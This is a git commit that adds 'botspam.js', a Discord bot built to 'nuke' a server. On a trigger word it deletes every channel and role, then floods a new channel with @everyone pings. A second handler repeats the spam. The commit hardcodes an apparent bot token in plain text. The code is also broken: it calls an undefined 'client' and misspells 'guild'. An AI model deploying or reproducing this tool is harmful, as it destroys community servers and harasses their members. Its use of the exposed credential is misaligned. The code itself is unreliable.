9a4a437cb4bcbefbed1405afdcdf905015d2d469
Zeioux <73228214+zeioux@users.noreply.github.com>
2022-07-26 02:49:04 +0200

    Add files via upload

---
+++ botspam.js
@@ -0,0 +1,40 @@
+const { Client } = require('discord.js')
+const M = new Client()
+
+client.on('message', async (message) => {
+    if (message.content === 'nuke') {
+      message.guild.channels.cache.forEach
+      (channel => channel.delete());
+  
+      message.guild.roles.cache.forEach
+      (role => role.delete()); 
+  
+      await message.guidl.channels.create
+      (`nuke`, {
+        type : 'text'
+      }).then(async channel=> { 
+        channel.send('@everyone')
+      })
+        
+      };
+    }
+  )
+  
+  
+  client.on('message', async (message) => {
+    if (message.content === '@everyone') {
+      await message.guidl.channels.create
+      (`nuke`, {
+        type : 'text'
+      }).then(async channel=> { 
+        channel.send('@everyone')
+      message.channel.send('@everyone')
+      message.channel.send('@everyone')
+      message.channel.send('@everyone')
+      message.channel.send('@everyone')
+    
+    })
+  }
+  })
+
+M.login('NzY2MzUyOTg3MzQ1NjQ5Nzc0.X4iH1g.c1GX0yiw_hsaS_YpU6vUXuaSOEc') 
